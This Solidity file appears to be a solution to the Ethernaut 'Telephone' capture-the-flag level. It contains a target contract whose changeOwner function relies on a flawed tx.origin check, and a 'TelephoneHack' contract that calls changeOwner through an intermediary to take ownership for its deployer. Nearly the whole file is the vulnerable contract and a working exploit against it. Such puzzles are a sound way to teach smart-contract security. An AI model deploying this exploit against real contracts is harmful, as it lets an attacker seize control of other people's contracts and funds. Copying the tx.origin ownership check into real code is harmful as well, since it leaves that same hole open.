// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHack {
    Telephone telephone;
    address owner;

    constructor(address _telephone) {
        owner = msg.sender;
        telephone = Telephone(_telephone);
    }

    function hack() public {
        telephone.changeOwner(owner);
    }
}